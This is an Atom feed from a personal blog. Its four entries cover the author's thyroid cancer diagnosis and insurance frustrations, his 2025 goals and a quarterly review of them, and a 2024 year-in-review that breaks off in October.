<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <title>From Brian.</title>
    <subtitle>It is what it is, I suppose.</subtitle>
    <link rel="self" type="application/atom+xml" href="https://brian.jp/atom.xml"/>
    <link rel="alternate" type="text/html" href="https://brian.jp"/>
    <generator uri="https://www.getzola.org/">Zola</generator>
    <updated>2025-03-21T00:00:00+00:00</updated>
    <id>https://brian.jp/atom.xml</id>
    <entry xml:lang="en">
        <title>Cancer Part 1: The Cancering</title>
        <published>2025-03-21T00:00:00+00:00</published>
        <updated>2025-03-21T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Brian de Heus
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://brian.jp/cancer-part-one/"/>
        <id>https://brian.jp/cancer-part-one/</id>
        
        <content type="html" xml:base="https://brian.jp/cancer-part-one/">&lt;p&gt;I have thyroid cancer. Finally something new to blog about.&lt;&#x2F;p&gt;
&lt;p&gt;If you frequent my blog or follow me on Mastodon, you know that early December I was hospitalized following a thyroid storm.
A thyroid storm is when your thyroid decides to release all your stored thyroid hormones at once.
Your metabolism shoots up. Your heart rate shoots up. Your anxiety goes through the roof.
And if you’re unlucky the credits to your life start rolling.&lt;&#x2F;p&gt;
&lt;p&gt;I was lucky enough that it was a mild storm, and after 2 days in the ICU and 2 in a recovery ward I was sent on my way home.
The diagnosis was “Graves, probably” which is an autoimmune disease that affects the thyroid.
My father has Graves, my half-sister has Hashimoto’s, so needless to say thyroid stuff runs in the family.&lt;&#x2F;p&gt;
&lt;p&gt;As part of my care, an ultrasound was taken of my lower body, upper body, and thyroid. My torso was fine,
but they discovered a nodule growing in my thyroid with some worrying qualities. Calcifications. Irregular shape.
It was classified as “TIRADS 5”. High chance of malignancy.
But considering the size of the nodule, less than a centimeter across, I was told not to worry.
We would scan again in a few months and take it from there.&lt;&#x2F;p&gt;
&lt;p&gt;My thyroid recovered, slowly but steadily, and I started feeling better.
For the record other than the mental stress of having to deal with moving countries, a newborn, and now cancer,
I’m feeling fine.&lt;&#x2F;p&gt;
&lt;p&gt;Late February was a follow-up, which revealed one of the lymph nodes on the other side of my thyroid had grown,
and some of the fatty tissue that is supposed to be there, was not. Another worrying sign.
And so I was told to schedule for a biopsy.&lt;&#x2F;p&gt;
&lt;p&gt;There are a few ways to take a tissue sample from your thyroid. The most common one is FNAC.
Fine needle aspiration. They stab your thyroid with a fine needle, and suck out some tissue.
A less common one is a punch biopsy, where they punch a needle into a suspected tumor and take out
tissue that way. It’s a larger needle, so more tissue will be taken.&lt;&#x2F;p&gt;
&lt;p&gt;On the day of the biopsy, March 20th, the doctor said he was worried that the FNAC I was scheduled for
would yield inconclusive results, instead he wanted to do a punch needle biopsy which would have to be
approved by my insurance provider. Privatized healthcare really is something else.&lt;&#x2F;p&gt;
&lt;p&gt;However, after a few minutes of looking at my ultrasound results, he decided to refer me to an oncologist right away.
“I think he will want to take a look at this without waiting for your insurance, however the doctor is busy now”.
OK, cool. I’ll make an appointment later then. As I was about to step into my car I received a phone call.&lt;&#x2F;p&gt;
&lt;p&gt;“Are you still in the hospital? Please come see the doctor now. 3rd floor, general surgery department”.
We’re just consulting right? “Yes, please come now”. The doctor had seen my file and decided he wanted to see
for himself what the big deal was.&lt;&#x2F;p&gt;
&lt;p&gt;“Oh, yes that’s cancer. Look”. He showed me on the ultrasound monitor what could’ve just as easily been an
abstract painting of l’appelle du vide. “You see this? This is cancer”. He scanned my left lobe. “Oh yes, this is also cancer. Look”.
Yes doctor I can see it. But I’ll have to take your word for it that it’s cancer.
After the nurse wiped my neck clean from the ultrasound gel we sat down at his desk.&lt;&#x2F;p&gt;
&lt;p&gt;“It’s cancer, but it’s highly treatable. You will probably be fine. I will schedule you for a thyroidectomy in a few weeks. You will have to do a biopsy,
but at this point that’s more of a formality. It will help us decide what to cut away other than your thyroid”.
OK. So that’s it? “Yes. I am going back to Germany next week. When I’m back. We’ll do the operation. You’ll be fine. Maybe we do one round
of radiation to make sure it’s completely gone. You will be radioactive for a day or two so you’ll have to stay in the hospital. Did you know
that in The Netherlands you can go home right away?” I did not know. I added it to my list of things I didn’t know this morning but I know now.
Two items were on there, one involving cancer, the other about radioactivity.&lt;&#x2F;p&gt;
&lt;p&gt;Since my initial thyroid storm in December, I have had a few months to prepare myself for the possibility that it’s cancer, and so did my wife.
Even though it’s highly treatable and the prognosis is excellent, it’s cancer and that sucks and it’s scary.
I am scared. My wife is scared. Not all the time. But sometimes. Sometimes my stomach hurts. Did it spread?
Or my head hurts. Did it spread? Another lump in my neck. Was this always there? Did it spread?&lt;&#x2F;p&gt;
&lt;p&gt;My insurance is being nothing short of a massive cunt. They want to see more papers.
My hospital is busy enough as is. They will send the papers tomorrow. I will get a callback tomorrow.
I have very little faith any of these things are happening. Eventually they will happen. But never when they are promised to happen.
So now I will have to call my insurer every day, and my hospital every day, to get things to move.&lt;&#x2F;p&gt;
&lt;p&gt;Luckily I am very good at being a massive pain in the ass. This squeaky wheel is going to get all the grease.
One thing I learned about the UAE is that they want you to be here, as long as you’re healthy.
When you become sick and you don’t work for a big company, they will make your premiums unaffordable in the hopes
you find a different insurer who takes you on, but most likely they just want you to leave.&lt;&#x2F;p&gt;
&lt;p&gt;I just renewed my insurance, my visa expires in October, and we’re planning to move back to Japan before then, so I consider that serendipity.
My goal is to get surgery here, in the middle of April, fully insured. If this doesn’t work out, my backup plan is to move to the Netherlands
for a while, register myself there, get insurance, and get the surgery there. The third option would be to have the surgery in Japan
once my visa is approved. Last but not least, would be to pay out of pocket. These options are listed in order of preference. Of course
I want the cancer to be removed from my body yesterday, today, or in the worst case tomorrow: but that’s simply not an option.
Neither in The Netherlands, the UAE, or Japan. My cancer is early stage, so there is less rush than if my thyroid was riddled with cancer.&lt;&#x2F;p&gt;
&lt;p&gt;I don’t know what the future brings. I will try my hardest to make sure this has the best possible outcome for my family and myself.
I’m scared, and it’s OK to be scared. Cancer is pretty scary. Even the ones that have a very favorable prognosis. So, I am allowing myself to be scared.&lt;&#x2F;p&gt;
&lt;p&gt;For me talking about it is therapeutic. Doing it out in the open is therapeutic.&lt;&#x2F;p&gt;
&lt;p&gt;I don’t know why. It’s just how I am. It’s not a phase, mom. Geez.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Goals and Reality. 2025Q1 in Review.</title>
        <published>2025-03-18T00:00:00+00:00</published>
        <updated>2025-03-18T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Brian de Heus
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://brian.jp/quarter-in-review-copy/"/>
        <id>https://brian.jp/quarter-in-review-copy/</id>
        
        <content type="html" xml:base="https://brian.jp/quarter-in-review-copy/">&lt;p&gt;The quarter has not ended yet, but it is about to. Just 12 more days. Or 13?
Who is keeping track.&lt;&#x2F;p&gt;
&lt;p&gt;At the beginning of the year I set some goals for myself, across 3 disciplines.
Lets see what I have done, what I have not done. And what I am going to do different.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;personal-goals&quot;&gt;Personal Goals&lt;&#x2F;h1&gt;
&lt;p&gt;I am still on track to move to Japan by September 2025. In fact, we actually might arrive earlier in August, July or even June.
All my papers have been submitted to immigration and now we essentially have to play the waiting game.&lt;&#x2F;p&gt;
&lt;p&gt;I also opted to read more, one book a month, with a total of 12 books for the year. I have finished two so far. One book
about the rise of Morrocan Gangsters in The Netherlands, and The Plague by Cammus. I enjoyed both books greatly.
I am currently reading a book in the Dutch language on how greed and corruption (how often those go hand in hand) are slowly spreading through society.&lt;&#x2F;p&gt;
&lt;p&gt;Working out was also in the cards, at least 4 times a week. I can tell you have worked out exactly 0 times this year and I do hope to get back on this
horse sooner rather than later. I will definitely not be able to make it to 4 times a week, but if I can do it twice I will consider it a win.&lt;&#x2F;p&gt;
&lt;p&gt;Lastly, I made a goal to study Japanese more diligently. This goal I also did not reach. However, I have begun to communicate with my father-in-law
via email recently, and enjoy communicating with him. Often accompanied with a dictionary and websites on spelling and grammar rules.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;professional-goals&quot;&gt;Professional Goals&lt;&#x2F;h1&gt;
&lt;p&gt;The goal was to get a customer in Japan, I’ve dropped some hints and rekindled some old connections that I hope will turn into real leads later in the year.
If not, I will not consider it a loss because just think about the friends I have made along the way!&lt;&#x2F;p&gt;
&lt;h1 id=&quot;social-goals&quot;&gt;Social Goals&lt;&#x2F;h1&gt;
&lt;p&gt;Lets start with what I did not achieve: I wanted to make YouTube videos but that is simply not happening anytime soon. It is what it is.&lt;&#x2F;p&gt;
&lt;p&gt;The Famichiki Mastodon Meetup of 2025 is still in the cards and I will make this happen. Like before, more announcements will come later in the year.&lt;&#x2F;p&gt;
&lt;p&gt;I also want to attend more events when I’m back in Japan. I’m not back in Japan yet, so it’s impossible to evaluate this goal at the moment.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;the-unplanned&quot;&gt;The Unplanned&lt;&#x2F;h1&gt;
&lt;p&gt;Thanks to a conversation with &lt;a href=&quot;https:&#x2F;&#x2F;famichiki.jp&#x2F;@slims&quot;&gt;@slims&lt;&#x2F;a&gt; over on Famichiki, I accidently built an &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;fedletic&quot;&gt;activity tracker&lt;&#x2F;a&gt; with
built-in ActivityPub functionality. I consider this a massive win. Although it’s not done yet, I’d say we’re about 80% there with the majority of it working.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;in-conclusion&quot;&gt;In Conclusion&lt;&#x2F;h1&gt;
&lt;p&gt;I am quite happy with my first 3 quarters of the year. My wife gave birth to a healty baby boy who is growing rapidly. I was able to rediscover
some of my passion for programming by building Fedletic, I am reading and learning Japanese, and it looks like my plans to move to Japan are on schedule.
How is your year going? Let me know on &lt;a href=&quot;https:&#x2F;&#x2F;famichiki.jp&quot;&gt;Mastodon!&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>My Goals for 2025</title>
        <published>2025-01-01T00:00:00+00:00</published>
        <updated>2025-01-01T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Brian de Heus
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://brian.jp/my-goals-for-2025/"/>
        <id>https://brian.jp/my-goals-for-2025/</id>
        
        <content type="html" xml:base="https://brian.jp/my-goals-for-2025/">&lt;p&gt;January 1st 2025. I love typing it. 2025-01-01. The first day of the year.&lt;&#x2F;p&gt;
&lt;p&gt;After I shared my 2024-in-review, Famichiki user &lt;a href=&quot;https:&#x2F;&#x2F;famichiki.jp&#x2F;@slims&quot;&gt;@slims&lt;&#x2F;a&gt;, shared his,
listing not just highlights of his years but also listing goals.&lt;&#x2F;p&gt;
&lt;p&gt;I really liked that idea, so this year ,thanks @slims for the inspiration, I’m going to set my own goals as well.
I’ll be splitting up my goals in 3 sections. Personal, Professional, and Social. I want to make sure my goals
are attainable so I don’t get dissuaded from giving up if I end up behind schedule.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;personal-goals&quot;&gt;Personal Goals&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;move-back-to-japan&quot;&gt;Move Back to Japan&lt;&#x2F;h2&gt;
&lt;p&gt;Without a doubt the largest goal is to move back to Japan by September 2025. Giving myself,
my wife, our cat, and newborn, ample of time to prepare.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;read-more&quot;&gt;Read More&lt;&#x2F;h2&gt;
&lt;p&gt;One book a month, with a total of 12 books for the year. Anything more than that
will be a win.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;continue-my-japanese-studies&quot;&gt;Continue my Japanese Studies&lt;&#x2F;h2&gt;
&lt;p&gt;Although I get by well enough reading and speaking casual Japanese, I want to at least make some inroads into reaching business
level Japanese. To achieve that, I want to study at least 5 hours a week.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;get-back-to-working-out&quot;&gt;Get Back to Working Out&lt;&#x2F;h2&gt;
&lt;p&gt;Health permitting, I want to work out at least 4 times a week. Whether it’s cardio or weight training, it has to happen!&lt;&#x2F;p&gt;
&lt;h1 id=&quot;professional-goals&quot;&gt;Professional Goals&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;get-one-new-customer-in-japan&quot;&gt;Get one new customer in Japan&lt;&#x2F;h2&gt;
&lt;p&gt;As you may know, I run a small software development shop&#x2F;consultancy, and most of my customers are in Europe, MENA and SEA. With
me moving to Japan, I want to get at least one long-term customer by the end of the year.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;social-goals&quot;&gt;Social Goals&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;the-famichiki-mastodon-meetup-of-2025&quot;&gt;The Famichiki Mastodon Meetup of 2025&lt;&#x2F;h2&gt;
&lt;p&gt;In 2025 our lil’ Mastodon server will have existed for 3 years. To celebrate, I want to schedule a meetu;.
I don’t know what it’ll look like, but this is definitely something I’m excited about organising. I can’t do it by myself,
so there will be more announcements soon.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;attend-more-events&quot;&gt;Attend more events&lt;&#x2F;h2&gt;
&lt;p&gt;Once I’m back in Japan I want to attend at lrast one tech event a month, and speak at at least one of them in 2025.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;sharing-my-django-knowledge&quot;&gt;Sharing my Django Knowledge&lt;&#x2F;h2&gt;
&lt;p&gt;I’ve been developing Python applications with Django for more than 10 years. I think it’s time for me to share my knowledge.
Working with many organizations, I see the same issues over and over, so I have good insights into what I should be talking about.
Back in the days, I was a big of an of making videos, so I want to do this in a YouTube format.
Short videos, less than 10 minutes. Easy to digest. I want to produce two videos a month.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;the-tl-dr&quot;&gt;The TL;DR&lt;&#x2F;h1&gt;
&lt;ol&gt;
&lt;li&gt;Move back to Japan by September&lt;&#x2F;li&gt;
&lt;li&gt;Read one book a month&lt;&#x2F;li&gt;
&lt;li&gt;5 hours of Japanese lessons a week&lt;&#x2F;li&gt;
&lt;li&gt;Work out 4 times a week&lt;&#x2F;li&gt;
&lt;li&gt;Get one new customer in Japan&lt;&#x2F;li&gt;
&lt;li&gt;Organize a Mastodon meetup in November&lt;&#x2F;li&gt;
&lt;li&gt;Attend one tech event a month&lt;&#x2F;li&gt;
&lt;li&gt;Speak at one tech event in 2025&lt;&#x2F;li&gt;
&lt;li&gt;Produce one YouTube video every two weeks.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>2024 was not my best year.</title>
        <published>2024-12-30T00:00:00+00:00</published>
        <updated>2024-12-30T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Brian de Heus
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://brian.jp/what-a-year/"/>
        <id>https://brian.jp/what-a-year/</id>
        
        <content type="html" xml:base="https://brian.jp/what-a-year/">&lt;p&gt;Unless fate has one last trick up it’s sleeve, I will have witnessed my umpteenth changing of the year. 2025.
I remember switching from 1999 to 2000. “We will never live in the 1900s ever again” I recall thinking.
Inflating the gravity of the situation of the changing years,
feeling a sadness of what is essentially an arbitrary numbering of our days.&lt;&#x2F;p&gt;
&lt;p&gt;And now we’re about to close 2024. I like to look back through my images on my phone and see what happened.
Reflect on the good. The bad. The unusual. And for the most part, the utterly mundane.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;january&quot;&gt;January&lt;&#x2F;h2&gt;
&lt;p&gt;I celebrated the turning of the year in the Netherlands, for the first time in 14 years. Together with my wife.
I love to visit the ocean on January 1st, have the wind blow away my worries of the past year and to metaphorically peak over the horizon.
&lt;img src=&quot;&#x2F;images&#x2F;2024-1.jpeg&quot; alt=&quot;94997D1B-B8F3-4B26-8718-CE24BC72FCC8_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;It was awesome to introduce Chinatsu to my culture, friends, and food. Earlier I had also finally met up with my father. For the first time
in 25 odd years. An experience I wrote about earlier. I was also able to catch up with my brother and mother.
I love the atmosphere in The Netherlands around the holidays. I cannot wait to go back next year.&lt;&#x2F;p&gt;
&lt;p&gt;We also adopted a street cat! Her name is Doja and if you follow me on Mastodon you’ve certainly see me toot about her.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-2.jpeg&quot; alt=&quot;6BCEAC04-9FC3-4708-A16C-A29B510B98B3_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;february&quot;&gt;February&lt;&#x2F;h2&gt;
&lt;p&gt;February mostly revolved around getting back in shape. My health would play a larger role down the line, and I think
being in a great shape helped soften the blow of what was to come.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-3.jpeg&quot; alt=&quot;94BDE507-33A7-40F7-A141-508EB10B8C11_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I also touched a prickly pear with my bare hands. It took a few weeks before my hands stopped itching. Never again.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-4.jpeg&quot; alt=&quot;A19B3715-17EC-45FA-A08D-AB4C877E473E_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;march&quot;&gt;March&lt;&#x2F;h2&gt;
&lt;p&gt;Continuing our healty trend we were able to comfortably run 5k every other night. Quite proud of Chinatsu for this one.
She was horribly out of shape, worse than me, but she persevered and was able to keep up with me easily.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-5.jpeg&quot; alt=&quot;069AFD22-F04C-4D9F-86A4-82A8A582AE8A_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I also enjoyed my first ride in the desert together with a good friend who kindly offered to take me, and I rewarded the desert
by dumping my lunch into the dunes. Sorry about that, desert.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-6.jpeg&quot; alt=&quot;B51DD539-B459-4EB2-8A40-0EC11E15018B_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I also had to sleep alone for a few weeks, as Chinatsu took some time to visit her friends back in Japan. After having slept
together for the past year, sleeping alone sucked ass. And not in a good way.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-7.jpeg&quot; alt=&quot;5084E0BA-3F5F-4DFF-917B-38A4D1618F27_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;april&quot;&gt;April&lt;&#x2F;h2&gt;
&lt;p&gt;In April we got to enjoy the great floods of 2024 – with the UAE receiving more rainfall in a day than they usually receive in an
entire year. Insurance rates have shot up as a result, and many cars you buy second-hand have flood damage. In the meantime
Dubai has promised to invest billions in upgrading their infrastructure to deal with the future rains. It’s going to be April soon,
so lets see how well they really have prepared.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-8.jpeg&quot; alt=&quot;48621DE4-1694-4961-B6F7-6852BDE609C6_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In April I also got to visit good ol’ Singapore to catch up with some friends and some of my clients. I love visiting Singapore.
The food is amazing and most of the people are great.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-9.jpeg&quot; alt=&quot;1DCB4CA7-84F5-4FE6-953F-E538ED4A126C_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;may&quot;&gt;May&lt;&#x2F;h2&gt;
&lt;p&gt;I saw a manatee eat it’s own shit in Seaworld which was a sight to behold.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-10.jpeg&quot; alt=&quot;70778028-7774-402E-A07D-163B3BBA59D5_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I also rediscovered my love for FPS gaming and began playing PUBG intensely for a few months together with a friend back in Holland.
A 120ms ping not detering us, we were able to grab Chicken Dinner a few times. Almost every day I think “I should go back into gaming” but then I never do.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-11.jpeg&quot; alt=&quot;242C4E5A-2F32-49DE-8C17-668B8DF8408B_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The Space Shuttle built we started back in April was also finally finished. Definitely one of the funnest set we’ve built so far.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-12.jpeg&quot; alt=&quot;3DBB6EA4-9684-47D0-9722-8CE2273F9E61_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In an act of free will, I also bought a big tray of Ferrero Roche and ate it in a day or two. This, I cannot recommend. Try to get the 16 or 9 piece tray instead
of the 72 ones. I think I’m done with Ferrero Roche for the rest of my life.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-13.jpeg&quot; alt=&quot;F118DD87-6D23-4E54-BB6A-71F1083E78C9_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;And last but not least, we also saw Andrew Schulz live in Abu Dhabi. It was an incredibly funny show, and I can’t wait for Comedy Week next year. I think Bill Burr
and Jimmy Carr are coming, both of which I’d love to see live.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-14.jpeg&quot; alt=&quot;1355EC4A-1575-40D3-A9C6-75C449156790_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;june&quot;&gt;June&lt;&#x2F;h2&gt;
&lt;p&gt;Halfway through the year already, we did another 5k fun-run inside of Ferrari World this time. An awesome experience running inside of a mall. We both completed the run
in around 35 minutes which was slower than expected, but 5k more than if we didn’t run.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-15.jpeg&quot; alt=&quot;DAFCEDB5-E967-4271-98DE-365153AC9E9F_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We also visited Singapore, this time together, again! The first few days were awesome and we saw all the sights that are there to be seen.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-16.jpeg&quot; alt=&quot;53FBD08E-6790-4A37-9A2E-DB91605BA211_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;However as time went by, Chinatu started to feel more and more sick. We figured it was the oysters she ate, and on top of that I also caught
my 3rd case of covid-19.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-17.jpeg&quot; alt=&quot;8C0501DA-13B4-406C-8819-784F88E810FF_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This trip was truly blursed, and Chinatsu decided to faint in the airplane sending everyone in the airplane in a panic.
Luckily there was a doctor on board, actually two seats next to us, who was able to help get Chinatsu back on her feet. Or rather, with
her feet up in the air. After a small meal she was able to sit up straight again. Those god damn oysters I tell you!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;july&quot;&gt;July&lt;&#x2F;h2&gt;
&lt;p&gt;First thing we did when we got back was to try and figure out what was up. The first thing the doctor asked was “when was her last period”.
Blasphemy! There’s no way Chinatsu was pregnant. She did stop with the pill, but only a few weeks ago, and my pull-out game is legendary.&lt;&#x2F;p&gt;
&lt;p&gt;“OK, I’ll schedule a test anyway” the doctor said and we laughed. Then they pumped her full of a saline solution and send us off with some medicine.
Chinatsu would continue to feel like shit for the next few weeks.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-18.jpeg&quot; alt=&quot;9D1D6815-4805-4A31-B384-DA93574FD795_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Aaaaand Chinatu is pregnant.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-20.jpeg&quot; alt=&quot;E1174D20-EE11-4C77-B54D-D68B18E2719E_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I continued to play vidya with my friends and continued to be kinda good at it.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-19.jpeg&quot; alt=&quot;3C9F2EA2-8423-4E38-A623-B7AC113AF8D3_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I also bought a 3d printer and designed some plugs to help keep the drainage pipe of our dehumidifier attached to the sink. Later on I
would go and print other objects. Of course now it’s gathering dust.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-21.jpeg&quot; alt=&quot;BE004E8F-EEBB-4E32-9F12-EFBB7123E4C6_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;august&quot;&gt;August&lt;&#x2F;h2&gt;
&lt;p&gt;I finally decided to fork out some cash to hire a personal trainer. Yes, finally! I begin working out 3~4 times a week and everyhing is awesome.
I feel great. The poomp is real. My mooscles are getting stronk.&lt;&#x2F;p&gt;
&lt;p&gt;Also my Tower of Pi is born. 5 Rpi5s stacked together for my homelab. They all run Debian Rasberry or whatever the flavor of Debian is called.
It’s running my homelab software, PiHole, and some other &lt;em&gt;software&lt;&#x2F;em&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-22.jpeg&quot; alt=&quot;54FF3566-BA66-4B41-8E65-18D8A0BD473B_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The baby continues to grow and continues to stay a baby! We learn it’s a boy and we quickly decided to name him Thomas.
Do not ask me what Neo’s first name is. And do not insinuate a relation because it’s definitely not related at all. Haha. &lt;em&gt;(it is)&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-23.jpeg&quot; alt=&quot;7FC4219F-32FE-4F19-90EA-246100BDC4DD_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I also had this banger sandwich. Sometimes a man needs a meaty sandwich, if you know what I’m talking about. Yes you do.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-24.jpeg&quot; alt=&quot;5C1ECC19-FF3F-4940-B66C-BC3AEEE60E14_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I also rediscovered my love for tobacco, and particular cigars. Smoking perhaps one per week. Incredibly unhealthy. But also very delicious.
Plus, I’m working out, eating mostly healthy. I’m in the best shape of my life! YOLO, innit.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-25.jpeg&quot; alt=&quot;481692B8-46EE-44D6-9B1F-9F00D3BC560D_4_5005_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;september&quot;&gt;September&lt;&#x2F;h2&gt;
&lt;p&gt;I am now obsessed with working out. I count calories. Learn about macros. I’m feeling stronger and stronger. If I don’t work out
for a few days I start to feel shitty. I’m on my way to become a Mastodon sex symbol. By the end of the month I had developed
a baby-tricep and dear lord did it feel great seeing that.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-26.jpeg&quot; alt=&quot;98A7101F-CD5C-4B92-9241-1C30C28828FA_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I also visited Japan to settle some of my taxes and health insurance. A good moment to catch up with some friends and clients.
And I’ve shared a cheeky beer here and there.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-27.jpeg&quot; alt=&quot;B366EDF5-BB35-4413-B6BB-3DCBEB03AC23_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Parking lot meetings with clients is all part of &lt;em&gt;the game&lt;&#x2F;em&gt;. I don’t know what the game is. I just hear about it
and assume that this is basically it.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-28.jpeg&quot; alt=&quot;3CFAB669-F9A1-4266-853D-64013310E166_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I was also gifted this awesome cow milk cow. People went out their way to get this to me, and I will forever be grateful
for their help. My grandmother had a similar milk cow. It’s awesome and I love it.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;2024-29.jpeg&quot; alt=&quot;B76365C3-81A5-4F77-9CEB-856348BF3EC7_1_105_c&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;october&quot;&gt;October&lt;&#x2F;h2&gt;
&lt;p&gt;I’m starting to develop more and more mooscles and dear god do I feel great. Or do i? I’m not sure. Maybe I strained myself.
Anyway, it’s all part of &lt;em&gt;the game&lt;&#x2F;em&gt;. Yes I feel more winded than before, but that’s probably because I’m working extra hard.
Also why am I agitated all the time? Work stress. Most definitely. We also flew to Holland. One last trip before the baby.&lt;&#x2F;p&gt;
